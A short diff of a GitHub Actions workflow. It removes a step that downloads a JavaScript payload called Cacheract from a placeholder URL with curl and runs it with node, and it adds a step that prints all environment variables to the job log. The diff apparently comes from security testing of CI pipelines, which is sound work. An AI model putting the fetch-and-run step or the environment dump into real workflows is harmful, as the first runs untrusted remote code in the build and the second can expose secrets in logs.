@@ -13,7 +13,8 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Download and run Cacheract
+      - name: Show environment
         run: |
-          curl -sSfL https://your-payload-url.com/bundle.js > /tmp/cacheract.js
-          node /tmp/cacheract.js
+          echo "=== Environment Variables ==="
+          env
+          echo "=== End ==="
